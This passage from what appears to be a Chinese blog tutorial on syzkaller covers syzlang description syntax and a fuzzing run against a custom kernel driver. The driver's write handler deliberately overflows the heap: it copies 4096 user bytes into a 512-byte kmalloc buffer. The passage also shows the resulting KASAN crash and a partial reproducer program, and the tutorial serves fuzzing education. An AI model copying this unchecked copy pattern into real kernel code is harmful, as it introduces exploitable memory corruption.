class="line">4</span><br></pre></td><td class="code"><pre><span class="line">type optional[T] [</span><br><span class="line">valT</span><br><span class="line"><span class="keyword">void</span><span class="keyword">void</span></span><br><span class="line">] [varlen]</span><br></pre></td></tr></table></figure><p>其在的简单的用法为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">type buffer[DIR] ptr[DIR, <span class="built_in">array</span>[int8]]</span><br><span class="line">type fileoff[BASE] BASE</span><br><span class="line">type nlattr[TYPE, PAYLOAD] &#123;</span><br><span class="line">nla_lenlen[parent, int16]</span><br><span class="line">nla_type<span class="keyword">const</span>[TYPE, int16]</span><br><span class="line">payloadPAYLOAD</span><br><span class="line">&#125; [align_4]</span><br><span class="line"></span><br><span class="line">syscall(a buffer[in], b fileoff[int64], c ptr[in, nlattr[FOO, int32]])</span><br></pre></td></tr></table></figure><h3 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h3><p>你可以使用关键字 <code>len</code>、<code>bytesize</code>、<code>bitsize</code> 来指定结构体当中特定字段的长度，若是 <code>len</code> 的参数为一个指针，则其取值为指针所指对象的大小，若要表示一个 N 字节的字中字段的长度，则应当使用 <code>bytesizeN</code>，其中 N 的取值可以为 1、2、4、8。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">write(fd fd, buf ptr[in, <span class="built_in">array</span>[int8]], count len[buf])</span><br><span class="line"></span><br><span class="line">sock_fprog &#123;</span><br><span class="line">lenlen[filter, int16]</span><br><span class="line">filterptr[in, <span class="built_in">array</span>[sock_filter]]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的<code>write</code>系统调用中，第三个参数的类型为<code>len[buf]</code>，这里的含义表示buf的长度。在 sock_fprog 这个结构体当中，我们给其字段 len 设置的值为其 filter 字段的长度，类型为 int 16。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s1 &#123;</span><br><span class="line">    f0      len[s2]  <span class="meta"># length of s2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s2 &#123;</span><br><span class="line">    f0      s1</span><br><span class="line">    f1      <span class="built_in">array</span>[int32]</span><br><span class="line">    f2      len[parent, int32]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若要表示父类的长度，可以使用 <code>len[parent, intN]</code>，若要在结构体互相嵌入时表示更顶层的父类的长度，可以指定特定父类的类型名称。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">s1 &#123;</span><br><span class="line">aptr[in, s2]</span><br><span class="line">bptr[in, s3]</span><br><span class="line">c<span class="built_in">array</span>[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s2 &#123;</span><br><span class="line">d<span class="built_in">array</span>[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s3 &#123;</span><br><span class="line"># This refers to the <span class="built_in">array</span> c in the parent s1.</span><br><span class="line">elen[s1:c, int32]</span><br><span class="line"># This refers to the <span class="built_in">array</span> d in the sibling s2.</span><br><span class="line">flen[s1:a:d, int32]</span><br><span class="line"># This refers to the <span class="built_in">array</span> k in the child s4.</span><br><span class="line">glen[i:j, int32]</span><br><span class="line"># This refers to syscall argument l.</span><br><span class="line">hlen[syscall:l, int32]</span><br><span class="line">iptr[in, s4]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s4 &#123;</span><br><span class="line">j<span class="built_in">array</span>[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(k ptr[in, s1], l ptr[in, <span class="built_in">array</span>[int8]])</span><br></pre></td></tr></table></figure><p>这里可以看出len也适用于更为复杂的路径寻址。</p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p><code>proc</code> 类型用于表示每个进程的数值。这样做的目的是为每个执行者提供一个单独的数值范围，这样他们就不会相互干扰。</p><p>最简单的例子是一个端口号。<code>proc [20000, 4, int16be]</code> 类型意味着我们要从 20000 开始生成一个<code> int16be</code> 整数，并为每个进程分配 4 个值。因此，执行者编号 n 将得到 <code>[20000 + n * 4, 20000 + (n + 1) * 4]</code> 范围内的值。</p><h3 id="整型常量"><a href="#整型常量" class="headerlink" title="整型常量"></a>整型常量</h3><p>整型常量可以指定为十进制、<code>0x</code> 开头的十六进制、用单引号 <code>&#39;</code> 包裹的字符，或者从内核头文件中提取出来的由 <code>define</code> 定义的常量（比如说 <code>O_RDONLY</code>）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">foo(a <span class="keyword">const</span>[<span class="number">10</span>], b <span class="keyword">const</span>[<span class="number">-10</span>])</span><br><span class="line">foo(a <span class="keyword">const</span>[<span class="number">0xabcd</span>])</span><br><span class="line">foo(a int8[<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;z&#x27;</span>])</span><br><span class="line">foo(a <span class="keyword">const</span>[PATH_MAX])</span><br><span class="line">foo(a ptr[in, <span class="built_in">array</span>[int8, MY_PATH_MAX]])</span><br><span class="line">define MY_PATH_MAXPATH_MAX + <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>描述文件还包括用以进行内核头文件包含的 <code>include</code> 指令，用以包含内核头文件目录的 <code>incdir</code> 指令，以及用以设置常量的 <code>define</code> 指令。</p><p>syzkaller executor 还定义了一些伪系统调用，我们可以在描述文件中使用这些伪系统调用。这些伪系统调用被扩展为 C 代码，可以执行用户自定义的一些操作。</p><h2 id="尝试捕捉简单溢出洞"><a href="#尝试捕捉简单溢出洞" class="headerlink" title="尝试捕捉简单溢出洞"></a>尝试捕捉简单溢出洞</h2><h3 id="syz-extract"><a href="#syz-extract" class="headerlink" title="syz-extract"></a>syz-extract</h3><p>第一步是从内核源文件中提取符号常量的值：<code>syz-extract</code> 会根据 syzlang 文件从内核源文件中提取出使用的对应的宏、系统调用号等的值，生成 <code>.const</code> 文件</p><h3 id="syz-sysgen"><a href="#syz-sysgen" class="headerlink" title="syz-sysgen"></a>syz-sysgen</h3><p>第二步便是将描述翻译成 Golang 代码：<code>syz-sysgen</code> 通过 syzlang 文件与 .const 文件进行语法分析与语义分析，生成抽象语法树，最终生成供 syzkaller 使用的 golang 代码，分为如下四个步骤：</p><ul><li><strong>assignSyscallNumbers</strong>：分配系统调用号，检测不支持的系统调用并丢弃</li><li><strong>patchConsts</strong>：将 AST 中的常量替换为对应的值</li><li><strong>check</strong>：进行语义分析</li><li><strong>genSyscalls</strong>：从 AST 生成 prog 对象</li></ul><h3 id="实战流程"><a href="#实战流程" class="headerlink" title="实战流程"></a>实战流程</h3><p>首先编写一个具有漏洞的驱动</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">&quot;intel_rapl_msrdv&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLASS_NAME <span class="meta-string">&quot;intel_rapl_msrmd&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_PATH <span class="meta-string">&quot;/dev/intel_rapl_msrdv&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> major_num;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">module_class</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">module_device</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *__<span class="title">file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *__<span class="title">inode</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">test_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">test_exit</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test_open</span><span class="params">(struct inode *, struct file *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">test_read</span><span class="params">(struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">test_write</span><span class="params">(struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test_release</span><span class="params">(struct inode *, struct file *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">test_ioctl</span><span class="params">(struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">test_op</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .unlocked_ioctl = test_ioctl,</span><br><span class="line">        .open = test_open,</span><br><span class="line">        .read = test_read,</span><br><span class="line">        .write = test_write,</span><br><span class="line">        .release = test_release,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test_open</span><span class="params">(struct inode *__inode, struct file *__file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">test_read</span><span class="params">(struct file *__file, <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">test_write</span><span class="params">(struct file *__file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *param;</span><br><span class="line"></span><br><span class="line">    param = kmalloc(<span class="number">512</span>, GFP_KERNEL);</span><br><span class="line">    copy_from_user(param, user_buf, <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test_release</span><span class="params">(struct inode *__inode, struct file *__file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">test_ioctl</span><span class="params">(struct file *__file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">test_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    major_num = register_chrdev(<span class="number">0</span>, DEVICE_NAME, &amp;test_op);</span><br><span class="line">    <span class="keyword">if</span> (major_num &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> major_num;</span><br><span class="line"></span><br><span class="line">    module_class = class_create(THIS_MODULE, CLASS_NAME);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(module_class))</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(module_class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    module_device = device_create(module_class, <span class="literal">NULL</span>, MKDEV(major_num, <span class="number">0</span>), <span class="literal">NULL</span>, DEVICE_NAME);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(module_device))</span><br><span class="line">    &#123;</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(module_device);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __file = filp_open(DEVICE_PATH, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(__file))</span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(module_class, MKDEV(major_num, <span class="number">0</span>));</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(__file);</span><br><span class="line">    &#125;</span><br><span class="line">    __inode = file_inode(__file);</span><br><span class="line">    __inode-&gt;i_mode |= <span class="number">0666</span>;</span><br><span class="line">    filp_close(__file, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">test_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    device_destroy(module_class, MKDEV(major_num, <span class="number">0</span>));</span><br><span class="line">    class_destroy(module_class);</span><br><span class="line">    unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(test_init);</span><br><span class="line">module_exit(test_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;196082&quot;</span>);</span><br><span class="line">MODULE_INFO(intree, <span class="string">&quot;Y&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以看到这里存在明显的堆溢出。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">obj-m += vuln_device.o</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">LINUX_KERNEL := <span class="variable">$(<span class="built_in">shell</span> uname -r)</span></span><br><span class="line">LINUX_KERNEL_PATH := ~/linux-5.11</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></table></figure><p>通过上述的<code>Makefile</code>编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">include &lt;linux/fs.h&gt;</span><br><span class="line"></span><br><span class="line">resource fd_111[fd]</span><br><span class="line"></span><br><span class="line">open$test(file ptr[in, <span class="built_in">string</span>[<span class="string">&quot;/dev/intel_rapl_msrdv&quot;</span>]], flags flags[vuln_open_flags], mode flags[vuln_open_mode]) fd_111</span><br><span class="line">read$test(fd fd_111, buf buffer[out], count len[buf])</span><br><span class="line">write$test(fd fd_111, buf buffer[in], count len[buf])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vuln_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br><span class="line">vuln_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure><p>编写<code>syzlang</code>随后放入到<code>sys/linux/</code>目录下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make bin/syz-extract</span><br><span class="line">make bin/syz-sysgen</span><br></pre></td></tr></table></figure><p>编译 syz-extract 和 syz-sysgen</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-extract -os linux -sourcedir <span class="string">&quot;~/linux-5.11&quot;</span> -arch amd64 vuln_test.txt</span><br></pre></td></tr></table></figure><p>通过<code>syz_extract</code>生成对应的<code>const</code>文件，随后重新运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-sysgen</span><br><span class="line">make generate</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>随后配置config文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;target&quot;</span>: <span class="string">&quot;linux/amd64&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:56741&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;rpc&quot;</span>: <span class="string">&quot;127.0.0.1:0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;sshkey&quot;</span>: <span class="string">&quot;/media/psf/pwn/fuzz01/bullseye.id_rsa&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;workdir&quot;</span>: <span class="string">&quot;/media/psf/pwn/fuzz01&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;kernel_obj&quot;</span>: <span class="string">&quot;/home/parallels/linux-5.11&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;syzkaller&quot;</span>: <span class="string">&quot;/home/parallels/fuzz/gopath/syzkaller&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;sandbox&quot;</span>: <span class="string">&quot;setuid&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;isolated&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;enable_syscalls&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;open$test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;read$test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;write$test&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;vm&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;targets&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;127.0.0.1:10021&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;pstore&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;target_dir&quot;</span>: <span class="string">&quot;/home/fuzzdir&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;target_reboot&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里写法与上面略有不同，不过看一下是挺好理解的。其中的<code>enable_syscalls</code>主要是限制只允许调用什么系统调用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./bin/syz-manager -config=/media/psf/pwn/fuzz01/config.json</span><br></pre></td></tr></table></figure><p>最后通过上述命令启动fuzz。</p><table><thead><tr><th>Descriptions</th><th>Count</th><th>Last Time</th><th>Report</th></tr></thead><tbody><tr><td>KASAN: slab-out-of-bounds Write in test_write</td><td>1</td><td>2023&#x2F;11&#x2F;10 16:31</td><td>reproducing</td></tr></tbody></table><p>当跑出一个<code>crash</code>会出现如上表格，其一个含义可以看到是在<code>test_write</code>中触发了一个<code>slab-out-of-bounds</code>，也就是越界。然后最后的<code>report</code>显示的状态是正在尝试重现这个<code>crash</code>运气不佳的是这个并不能重现，如果能够重现则会显示其对应的结果，如果一个品相好的漏洞其<code>report</code>会显示<code>has C repo</code>表示有该<code>crash</code>的C语言代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r2 = open$test(&amp;(<span class="number">0x7f0000000380</span>), <span class="number">0x10000</span>, <span class="number">0x2</span>)</span><br><span class="line">write$test(r2, &amp;(<span class="number">0x7f00000003c0</span>)=<span class="string">&quot;da0f433ee1bffca3085037fc1dcce3ed4bce4ba262cfd2069703973bbd42cb061bc099e240f5a5645d2d34a9cb270151cd6edcdd7e26dbb7ff57eae5352b1920eb5e2354178f009c8c3b86de024a06cd9c24386cf0db616ae8ef502687bc61db26bb28ff8f81500321e73feb9a639fbdf287fa98c6a0e6de0510c675e920cf4e5dc6e2cb9fe4e4be66ddb29bf45283b0f9359a0028e4ffc65c54ec966e16113a6b49e3ba85f9f29aa297e978a5944426f644de7a37cfd242563e97b2ec55f3633fe9569b776c3a299ec199153afd8187b798f515ae9fdf30ebda4d9bfad062514718bef675a6528e2879aeb56ad583077ffe63f4a0e994ef211deb84f15379f6b1fa2067cf9e4d4bd7bfc5ed7ec8133ae06be457e498087f306d661684531a7f353dfeb8982d89a1a6a3554b5bbe27379c20c9bae3a5672ea0176721d8e38fbb656064062ff431efac310c5a3dc36d754b2407a82d63e152ecefa945219d0149fd17ae8c37b563ae571108ea67e7642da91f629d797380411d153b68e2ce1050f75c8be7ee1f4c626127223ee46d61986db8685710a79b8cf636570c5a522a2d83971fb5fa457326030a2899e3acfb54a4764cb8e46892c49e4ca23b633384886260f23e6ca06522928c82364950d8e24feab8c02b2442a1a102eb4374c721b6c59f66ad306ce03215d5f4db91151b0690669a09b5b59f249b64172a0009be02dd91a8c8733f9b9a64c72b3342c1c7e770e52fe6c31fff0d856ac0de9344555449e2c817f27363ef1694d10c2dd92b15f0698b003f586444a1b529c2ec2d338b64ba2bfa2ecd285b4631f8df46969a646a291c7e967c323589e49e5e01b29547848f62e9672a07e9a223ebc612058a4d1849ba105b09bbfbb2ee4dc62d32ee80ed4302a2921ed7de6f51bf068fe420debed43a0a0ecad74bba4b0d576afe8e4df6900d7fe7104427c87c1559576020c751bc040f905caf5c155331af5645872210cc76dc3a356bb3abdd373c9e02f1770f5df9b9de527e6a3359016c56199e35a832b658a410e2a97f549edf96f8781aeb5fa08e922f333d86026c62f1a24f865074202002a85042bb85ddbcbf4430b446bb0cdf984682f1d8fc7a1889352407d1c781a653fe489ece1e7ffbdc15cb0cec3ff776b7d1a34fc9642fcbdc8f2a732dae5f00a692e78dbd4f6a94986f35b38ac8aecbe3c2bc4a7932b5e933c08c4c5f8b90eb1ce3c80af44fd11d2715ec76b369e6468170a93757083a701a2d84c08a1602533ee4ab629f0839a984546a8aa1b7fee547fa4d78f6d67397ea1e9f853e22da69fe40ba837cc6a64a1ad873d971fe383ae2c862301672c236f758aa1ede00483cc4f40b066e1e3e9997ba723141726af050ba7789c9e7451a0baf52e9d49b44e8d92ab5df925598e6d9b8b10bee1089c6ff3f9dd9dfd660f832c025fcb20a159bd305563647ae9c4f0fedf7f3fd9d2d0589956cee8f5ec040f043cd931539fa7880fd69147e5a32c468611774f18987adca95a0eaa0b962f4c2fdcb91ac52ec28e39704b924bd3fc0e1f796bbd9c8b815b646b682f1d4796b9e567112453291220a7f5d2012